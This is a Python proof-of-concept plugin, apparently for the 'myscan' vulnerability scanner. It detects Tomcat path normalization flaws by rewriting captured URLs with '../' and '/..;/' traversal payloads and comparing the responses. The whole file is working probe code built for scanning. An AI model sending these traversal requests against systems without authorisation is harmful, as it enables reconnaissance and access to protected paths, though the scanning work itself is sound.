# !/usr/bin/env python3
# @Time    : 2020/8/30
# @Author  : caicai
# @File    : poc_tomcat-manager-pathnormalization_verify_2020.py


from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.core.common import similar

from myscan.lib.core.base import PocBase


class POC(PocBase):
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        # scheme的poc不同perfoler和perfile,没有workdata没有data字段,所以无self.url
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "Tomcat Manager Path Normalization,vuln"
        self.vulmsg = '''Your can enum the path2 with like : /path../path2 ,/path/..;/path2,path2 is a dirfile .referer:https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf'''
        self.level = 2  # 0:Low  1:Medium 2:High
        self.min_similar_rate = 0.98

    def verify(self):
        if self.dictdata.get("url").get("url").count("/") >= 4 and self.dictdata.get("url").get("extension") in [
            "js", "css"] and self.dictdata.get("response").get("status") == 200:
            parse = dictdata_parser(self.dictdata)
            if self.can_output(parse.getrootpath() + self.name):
                url = self.dictdata.get("url").get("url")
                url_split = url.split("/")
                for new_url in [
                    "/".join(url_split[:3] + [url_split[3] + "../" + url_split[3]] + url_split[4:]),
                    "/".join(url_split[:3] + [url_split[3] + "/..;/" + url_split[3]] + url_split[4:])
                ]:
                    req = parse.generaterequest({
                        "url": new_url
                    })
                    r = request(**req)
                    if r is not None and r.status_code == self.dictdata.get("response").get("status"):
                        similar_rate = similar(parse.getresponsebody(), r.content)

                        if similar_rate > self.min_similar_rate:
                            self.result.append({
                                "name": self.name,
                                "url": parse.getrootpath(),
                                "level": self.level,  # 0:Low  1:Medium 2:High
                                "detail": {
                                    "vulmsg": self.vulmsg,
                                    "source_url": url,
                                    "new_url": new_url,
                                    "similar_rate": similar_rate
                                }
                            })
                            self.can_output(parse.getrootpath() + self.name, True)
